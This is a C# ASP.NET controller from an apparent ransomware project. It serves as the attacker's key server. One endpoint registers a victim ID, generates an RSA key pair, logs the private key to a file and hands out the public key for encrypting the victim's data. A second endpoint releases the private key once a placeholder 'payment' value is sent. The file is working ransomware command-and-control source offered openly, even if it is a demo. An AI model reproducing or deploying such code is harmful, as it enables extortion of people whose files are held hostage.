﻿using RansomwareWebApp.Models;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Web;
using System.Web.Mvc;
using RansomwareWebApp.Properties;
namespace RansomwareWebApp.Controllers
{
    public class RansomController : Controller
    {
        private static Dictionary<string, VictimEntry> _db = new Dictionary<string, VictimEntry>();
        //support for sending the AES key back to the server (unnecessary in current model)
        //private static RSACryptoServiceProvider SERVER_CRYPTO = new RSACryptoServiceProvider();
        //private static string PUBLIC_KEY_XML;
        //public RansomController()
        //{
        //    if (!System.IO.File.Exists(Settings.Default.PRIVATE_KEY_PATH)) GenerateKeys(); //generate server keys if needed
        //    SERVER_CRYPTO.FromXmlString(System.IO.File.ReadAllText(Settings.Default.PRIVATE_KEY_PATH));
        //    PUBLIC_KEY_XML = System.IO.File.ReadAllText(Settings.Default.PUBLIC_KEY_PATH);
        //}
        //private void GenerateKeys()
        //{
        //    var RSA = new RSACryptoServiceProvider(2048);
        //    System.IO.File.AppendAllText(Settings.Default.PUBLIC_KEY_PATH, RSA.ToXmlString(false));
        //    System.IO.File.AppendAllText(Settings.Default.PRIVATE_KEY_PATH, RSA.ToXmlString(true));
        //}

        //[Route("publickey")]
        //public string GetPublicKey()
        //{
        //    return PUBLIC_KEY_XML;
        //}

        [Route("ransom/paid/{guid}")]
        public string GetUnlockKey(string guid)
        {
            //attacks on the guid/DoS
            if(new Regex(@"[^a-zA-Z0-9\-]+").Match(guid).Success || !_db.ContainsKey(guid)) return string.Empty;
            //TODO: mark in database add further features, return "TERM/TIME"
            string body;
            var request = Request.InputStream;
            request.Seek(0, SeekOrigin.Begin);
            using (var stream = new StreamReader(request, Encoding.UTF8))
            {
                try
                {
                    body = stream.ReadToEnd();
                }
                catch(Exception) 
                {
                    _db.Remove(guid); //DoS application-based attack
                    return "TERM";
                }
            }         
            //attacks on the body format
            if (new Regex(@"[^a-zA-Z0-9\-]+").Match(body).Success) return "ALERT";   
            //validate payment
            if (body == "42") return _db[guid].RSA.ToXmlString(true);
            //TODO: if too many failed attempts send TERM signal
            return string.Empty;
            
        }
        
        [Route("ransom/{guid}")]
        public string GetVictimKey(string guid)
        {

            _db[guid] = new VictimEntry(new RSACryptoServiceProvider(2048));      
            System.IO.File.AppendAllText("C:\\victim.log", $"{guid},{_db[guid].RSA.ToXmlString(true)}{Environment.NewLine}");
            return _db[guid].RSA.ToXmlString(false);
        }
    }
}
